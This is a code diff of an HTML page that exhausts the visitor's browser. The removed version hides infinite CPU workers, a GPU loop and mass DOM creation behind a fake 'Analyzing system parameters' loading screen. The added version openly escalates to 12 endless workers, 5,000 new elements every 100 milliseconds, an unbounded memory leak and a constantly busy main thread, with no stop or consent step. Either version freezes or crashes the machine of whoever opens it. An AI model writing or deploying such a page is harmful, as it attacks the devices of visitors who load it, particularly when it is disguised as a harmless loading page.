@@ -2,104 +2,62 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Stress Test</title>
+    <title>MAXIMUM STRESS TEST</title>
     <style>
-        body {
-            background-color: #050505;
-            color: #00ff00;
-            font-family: 'Courier New', Courier, monospace;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
-        }
-        .container { text-align: center; z-index: 10; position: relative; }
-        .loader {
-            border: 5px solid #333;
-            border-top: 5px solid #00ff00;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-        }
-        /* Style for the 'spam' divs */
-        .spam-div {
-            width: 2px;
-            height: 2px;
-            background: #00ff00;
-            float: left;
-            opacity: 0.1;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #timer { font-size: 24px; font-weight: bold; }
+        body { background: #000; color: #f00; font-family: monospace; overflow: hidden; margin: 0; }
+        .warning { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; z-index: 9999; pointer-events: none; }
+        /* Tiny divs to force the GPU to calculate thousands of positions */
+        .particle { width: 1px; height: 1px; position: absolute; background: red; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>PLEASE WAIT...</h1>
-        <p>Analyzing system parameters...</p>
-        <div class="loader"></div>
-        <div id="timer">Calculating: 60s</div>
+    <div class="warning">
+        <h1>CRITICAL LOAD</h1>
+        <div id="stats">Initializing...</div>
     </div>
 
-    <canvas id="gpu-stress" style="display:none;"></canvas>
-
     <script>
-        // 1. THE TIMER
-        let timeLeft = 60; 
-        const timerElement = document.getElementById('timer');
-
-        const countdown = setInterval(() => {
-            timeLeft--;
-            if (timerElement) timerElement.innerText = `Calculating: ${timeLeft}s`;
-            if (timeLeft <= 0) {
-                clearInterval(countdown);
-                alert("Task Complete.");
-            }
-        }, 1000);
-
-        // 2. CPU STRESS
-        for (let i = 0; i < 4; i++) {
-            const blob = new Blob([`while(true){Math.sqrt(Math.random()*Math.random())}`], {type: 'text/javascript'});
-            const workerURL = URL.createObjectURL(blob);
-            new Worker(workerURL);
+        // 1. INCREASED CPU WORKERS (Matches Core Count or higher)
+        // We spawn 12 workers instead of 4 to saturate almost any consumer CPU
+        for (let i = 0; i < 12; i++) {
+            const blob = new Blob([`setInterval(() => { while(true) { Math.atan2(Math.random(), Math.random()); } }, 1)`], {type: 'text/javascript'});
+            new Worker(URL.createObjectURL(blob));
         }
 
-        // 3. GPU STRESS (WebGL)
-        const canvas = document.getElementById('gpu-stress');
-        const gl = canvas.getContext('webgl');
-        if (gl) {
-            function draw() {
-                gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
-                gl.clear(gl.COLOR_BUFFER_BIT);
-                requestAnimationFrame(draw);
+        // 2. INFINITE DOM SPAM (The "Alot Alot" Divs)
+        const spamDivs = () => {
+            const fragment = document.createDocumentFragment();
+            for (let i = 0; i < 5000; i++) {
+                const d = document.createElement('div');
+                d.className = 'particle';
+                d.style.left = Math.random() * 100 + "vw";
+                d.style.top = Math.random() * 100 + "vh";
+                fragment.appendChild(d);
             }
-            draw();
-        }
+            document.body.appendChild(fragment);
+        };
+        // Adds 5,000 new divs every 100ms forever
+        setInterval(spamDivs, 100);
 
-        // 4. MEMORY STRESS
-        let garbage = [];
+        // 3. RAPID MEMORY LEAK (The "Black Hole")
+        // This creates massive strings and stores them in a global array that never clears
+        let leak = [];
         setInterval(() => {
-            for(let i=0; i<5000; i++) {
-                garbage.push(new Array(1000).fill("STRESS"));
-            }
-            if(garbage.length > 50) garbage.shift(); 
-        }, 200);
+            let chunk = new Array(100000).fill("STRESS_TEST_DATA_MAX_BLOAT").join("-");
+            leak.push(chunk);
+            document.getElementById('stats').innerText = `Memory Blocks: ${leak.length} | Elements: ${document.querySelectorAll('div').length}`;
+        }, 50);
 
-        // 5. DOM STRESS (DIV SPAM)
-        // This loop creates 10,000 divs and adds them to the page
-        const spamCount = 99999;
-        for (let i = 0; i < spamCount; i++) {
-            const div = document.createElement('div');
-            div.className = 'spam-div';
-            document.body.appendChild(div);
+        // 4. RECURSIVE HELL (Stack Overflow path)
+        // This function calls itself constantly to keep the main thread busy
+        function recurse() {
+            setTimeout(() => {
+                for(let i=0; i<1000; i++) { Math.exp(i); }
+                recurse();
+            }, 0);
         }
+        recurse();
 
     </script>
 </body>
